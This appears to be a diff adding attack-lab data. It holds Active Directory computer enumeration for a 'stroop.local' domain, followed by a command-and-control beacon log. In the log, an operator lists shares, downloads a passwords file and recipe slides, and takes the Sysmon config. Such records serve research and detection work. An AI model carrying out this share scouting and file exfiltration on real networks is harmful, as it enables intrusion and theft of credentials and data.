+useraccountcontrol            : 4096
+whencreated                   : 3/29/2020 10:22:39 AM
+primarygroupid                : 515
+pwdlastset                    : 3/29/2020 10:22:39 AM
+msds-supportedencryptiontypes : 28
+name                          : L-WIN225
+dnshostname                   : L-WIN225.stroop.local
+
+iscriticalsystemobject        : False
+distinguishedname             : CN=L-WIN226,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 10:24:59 AM
+name                          : L-WIN226
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-4884
+samaccountname                : L-WIN226$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 10:39:40 AM
+countrycode                   : 0
+cn                            : L-WIN226
+accountexpires                : 9223372036854775807
+adspath                       : LDAP://CN=L-WIN226,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+instancetype                  : 4
+usncreated                    : 20824
+objectguid                    : 34bdae43-1ba1-45ee-a3cf-ab25e6f9cd30
+operatingsystem               : Windows 10 Enterprise LTSC
+operatingsystemversion        : 10.0 (17763)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {WSMAN/L-WIN226, WSMAN/L-WIN226.stroop.local, TERMSRV/L-WIN226, 
+                                TERMSRV/L-WIN226.stroop.local...}
+useraccountcontrol            : 4096
+whencreated                   : 3/29/2020 10:24:59 AM
+primarygroupid                : 515
+pwdlastset                    : 3/29/2020 10:24:59 AM
+msds-supportedencryptiontypes : 28
+usnchanged                    : 20824
+dnshostname                   : L-WIN226.stroop.local
+
+logoncount                    : 8
+iscriticalsystemobject        : False
+description                   : ADMIN workstation of ADMIN-w.trommel
+distinguishedname             : CN=L-WIN227,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 10:27:16 AM
+name                          : L-WIN227
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-4885
+samaccountname                : L-WIN227$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 11:30:05 AM
+countrycode                   : 0
+cn                            : L-WIN227
+accountexpires                : 9223372036854775807
+adspath                       : LDAP://CN=L-WIN227,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+instancetype                  : 4
+usncreated                    : 20826
+objectguid                    : 6199a74b-c55c-4b13-8c10-9adc295d646a
+operatingsystem               : Windows 10 Enterprise LTSC
+operatingsystemversion        : 10.0 (17763)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {WSMAN/L-WIN227, WSMAN/L-WIN227.stroop.local, TERMSRV/L-WIN227, 
+                                TERMSRV/L-WIN227.stroop.local...}
+lastlogon                     : 3/30/2020 7:46:16 AM
+useraccountcontrol            : 4096
+whencreated                   : 3/29/2020 10:27:16 AM
+primarygroupid                : 515
+pwdlastset                    : 3/29/2020 10:27:16 AM
+msds-supportedencryptiontypes : 28
+usnchanged                    : 30968
+dnshostname                   : L-WIN227.stroop.local
+
+logoncount                    : 3
+iscriticalsystemobject        : False
+description                   : ADMIN workstation of ADMIN-a.kool
+distinguishedname             : CN=L-WIN228,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 10:29:36 AM
+name                          : L-WIN228
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-4886
+samaccountname                : L-WIN228$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 11:30:05 AM
+countrycode                   : 0
+cn                            : L-WIN228
+accountexpires                : 9223372036854775807
+adspath                       : LDAP://CN=L-WIN228,OU=EUC,OU=Office,OU=Systems,DC=stroop,DC=local
+instancetype                  : 4
+usncreated                    : 20828
+objectguid                    : e960b9ef-6f1e-40dd-82fd-129e0ad7b5a2
+operatingsystem               : Windows 10 Enterprise LTSC
+operatingsystemversion        : 10.0 (17763)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {WSMAN/L-WIN228, WSMAN/L-WIN228.stroop.local, TERMSRV/L-WIN228, 
+                                TERMSRV/L-WIN228.stroop.local...}
+lastlogon                     : 3/30/2020 8:11:41 AM
+useraccountcontrol            : 4096
+whencreated                   : 3/29/2020 10:29:35 AM
+primarygroupid                : 515
+pwdlastset                    : 3/29/2020 10:29:35 AM
+msds-supportedencryptiontypes : 28
+usnchanged                    : 30979
+dnshostname                   : L-WIN228.stroop.local
+
+logoncount                    : 16
+badpasswordtime               : 1/1/1601 12:00:00 AM
+description                   : Steppingstone to s-lin99 (Main factory and recipe controller)
+distinguishedname             : CN=S-WIN45,OU=Factory,OU=Systems,DC=stroop,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 3/29/2020 10:50:59 AM
+name                          : S-WIN45
+objectsid                     : S-1-5-21-2163199188-2306780613-1636707950-5602
+samaccountname                : S-WIN45$
+localpolicyflags              : 0
+lastlogon                     : 3/30/2020 8:33:47 AM
+codepage                      : 0
+samaccounttype                : 805306369
+whenchanged                   : 3/29/2020 11:30:05 AM
+accountexpires                : 9223372036854775807
+countrycode                   : 0
+adspath                       : LDAP://CN=S-WIN45,OU=Factory,OU=Systems,DC=stroop,DC=local
+instancetype                  : 4
+operatingsystem               : Windows Server 2012 R2 Datacenter
+objectguid                    : b358eff4-301e-4bed-a9cf-00c12602e854
+operatingsystemversion        : 6.3 (9600)
+lastlogoff                    : 1/1/1601 12:00:00 AM
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=stroop,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {TERMSRV/S-WIN45, TERMSRV/S-WIN45.stroop.local, WSMAN/S-WIN45, 
+                                WSMAN/S-WIN45.stroop.local...}
+whencreated                   : 3/29/2020 10:50:58 AM
+iscriticalsystemobject        : False
+badpwdcount                   : 0
+cn                            : S-WIN45
+useraccountcontrol            : 4096
+usncreated                    : 28793
+primarygroupid                : 515
+pwdlastset                    : 3/29/2020 10:50:58 AM
+msds-supportedencryptiontypes : 28
+usnchanged                    : 30969
+dnshostname                   : S-WIN45.stroop.local
+
+
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+
+03/30 09:22:04 UTC [input] <neo> sleep 60
+03/30 09:22:04 UTC [task] <T1029> Tasked beacon to sleep for 60s
+03/30 09:22:05 UTC [checkin] host called home, sent: 16 bytes
+03/30 09:23:14 UTC [input] <neo> sleep 5
+03/30 09:23:14 UTC [task] <T1029> Tasked beacon to sleep for 5s
+03/30 09:24:06 UTC [checkin] host called home, sent: 16 bytes
+03/30 09:29:44 UTC [input] <neo> shell net use
+03/30 09:29:44 UTC [task] <T1059> Tasked beacon to run: net use
+03/30 09:29:48 UTC [checkin] host called home, sent: 38 bytes
+03/30 09:29:48 UTC [output]
+received output:
+New connections will be remembered.
+
+
+Status       Local     Remote                    Network
+
+-------------------------------------------------------------------------------
+OK           H:        \\S-win43\UserHome$\W.Tax Microsoft Windows Network
+The command completed successfully.
+
+
+
+03/30 09:29:56 UTC [input] <neo> dir \\s-win43\
+03/30 09:29:56 UTC [error] Unknown command: dir \\s-win43\
+03/30 09:29:59 UTC [input] <neo> shell dir \\s-win43\
+03/30 09:29:59 UTC [task] <T1059> Tasked beacon to run: dir \\s-win43\
+03/30 09:30:03 UTC [checkin] host called home, sent: 45 bytes
+03/30 09:30:03 UTC [output]
+received output:
+The specified path is invalid.
+
+
+03/30 09:30:13 UTC [input] <neo> shell dir \\s-win43.stroop.local\
+03/30 09:30:13 UTC [task] <T1059> Tasked beacon to run: dir \\s-win43.stroop.local\
+03/30 09:30:13 UTC [checkin] host called home, sent: 58 bytes
+03/30 09:30:13 UTC [output]
+received output:
+The specified path is invalid.
+
+
+03/30 09:30:33 UTC [checkin] host called home, sent: 31 bytes
+03/30 09:30:44 UTC [checkin] host called home, sent: 20 bytes
+03/30 09:30:50 UTC [input] <neo> download H:\RecipeTeammeeting_Apr1_newrecipes.pptx
+03/30 09:30:50 UTC [task] <T1005> Tasked beacon to download H:\RecipeTeammeeting_Apr1_newrecipes.pptx
+03/30 09:30:54 UTC [checkin] host called home, sent: 49 bytes
+03/30 09:30:54 UTC [output]
+started download of H:\RecipeTeammeeting_Apr1_newrecipes.pptx (1056424 bytes)
+
+03/30 09:30:57 UTC [input] <neo> download H:\passwords.txt.txt
+03/30 09:30:57 UTC [task] <T1005> Tasked beacon to download H:\passwords.txt.txt
+03/30 09:30:59 UTC [checkin] host called home, sent: 28 bytes
+03/30 09:30:59 UTC [output]
+started download of H:\passwords.txt.txt (114 bytes)
+
+03/30 09:30:59 UTC [output]
+download of passwords.txt.txt is complete
+
+03/30 09:31:04 UTC [output]
+download of RecipeTeammeeting_Apr1_newrecipes.pptx is complete
+
+03/30 09:31:09 UTC [checkin] host called home, sent: 27 bytes
+03/30 09:31:09 UTC [error] could not open \\s-win43\*: 67
+03/30 09:33:25 UTC [input] <neo> shell net view \\s-win43
+03/30 09:33:25 UTC [task] <T1059> Tasked beacon to run: net view \\s-win43
+03/30 09:33:25 UTC [checkin] host called home, sent: 49 bytes
+03/30 09:33:25 UTC [output]
+received output:
+Shared resources at \\s-win43
+
+
+
+Share name        Type  Used as  Comment  
+
+-------------------------------------------------------------------------------
+DepartmentShares  Disk                    
+Software          Disk                    
+The command completed successfully.
+
+
+
+03/30 09:33:41 UTC [input] <neo> shell dir \\s-win43\DepartmentShares
+03/30 09:33:41 UTC [task] <T1059> Tasked beacon to run: dir \\s-win43\DepartmentShares
+03/30 09:33:46 UTC [checkin] host called home, sent: 61 bytes
+03/30 09:33:46 UTC [output]
+received output:
+ Volume in drive \\s-win43\DepartmentShares is Windows
+ Volume Serial Number is BA06-AED5
+
+ Directory of \\s-win43\DepartmentShares
+
+03/29/2020  10:53 AM    <DIR>          .
+03/29/2020  10:53 AM    <DIR>          ..
+03/29/2020  10:53 AM    <DIR>          FinanceDept
+03/29/2020  10:53 AM    <DIR>          HRDept
+03/29/2020  10:53 AM    <DIR>          ITDept
+03/29/2020  10:53 AM    <DIR>          LogisticsDept
+03/29/2020  10:53 AM    <DIR>          MngtBoard
+03/29/2020  10:53 AM    <DIR>          RiskDept
+03/29/2020  11:03 AM    <DIR>          Software
+               0 File(s)              0 bytes
+               9 Dir(s)  106,498,801,664 bytes free
+
+
+03/30 09:33:55 UTC [input] <neo> shell dir \\s-win43\Software
+03/30 09:33:55 UTC [task] <T1059> Tasked beacon to run: dir \\s-win43\Software
+03/30 09:33:56 UTC [checkin] host called home, sent: 53 bytes
+03/30 09:33:56 UTC [output]
+received output:
+ Volume in drive \\s-win43\Software is Windows
+ Volume Serial Number is BA06-AED5
+
+ Directory of \\s-win43\Software
+
+03/29/2020  11:03 AM    <DIR>          .
+03/29/2020  11:03 AM    <DIR>          ..
+03/29/2020  11:03 AM         1,735,168 7zx64.msi
+03/29/2020  11:03 AM         4,228,352 BgInfo64.exe
+03/29/2020  11:03 AM        60,940,800 chromex64.msi
+03/29/2020  11:03 AM        21,368,251 GRR_3.2.2.0_amd64.exe
+03/29/2020  11:03 AM             4,336 netcease.ps1
+03/29/2020  11:03 AM         9,981,952 nppx64.msi
+03/29/2020  10:57 AM    <DIR>          Office16
+03/29/2020  10:57 AM     3,643,833,378 Office16x86.zip
+03/29/2020  11:02 AM         3,048,960 puttyx64.msi
+03/29/2020  11:02 AM         1,973,624 sysmon64.exe
+03/29/2020  11:02 AM           113,354 sysmonconfig-export.xml
+03/29/2020  11:03 AM        55,854,864 VSCodeUserSetup-x64-1.40.2.exe
+              11 File(s)  3,803,083,039 bytes
+               3 Dir(s)  106,498,801,664 bytes free
+
+
+03/30 09:34:16 UTC [checkin] host called home, sent: 36 bytes
+03/30 09:34:22 UTC [input] <neo> download \\s-win43\Software\sysmonconfig-export.xml
+03/30 09:34:22 UTC [task] <T1039> Tasked beacon to download \\s-win43\Software\sysmonconfig-export.xml
+03/30 09:34:26 UTC [checkin] host called home, sent: 50 bytes
+03/30 09:34:26 UTC [output]
+started download of \\s-win43\Software\sysmonconfig-export.xml (113354 bytes)
+
+03/30 09:34:26 UTC [output]
+download of sysmonconfig-export.xml is complete
+
+03/30 12:21:48 UTC [input] <neo> sleep 60 5
+03/30 12:21:48 UTC [task] <T1029> Tasked beacon to sleep for 60s (5% jitter)
+03/30 12:21:49 UTC [checkin] host called home, sent: 16 bytes
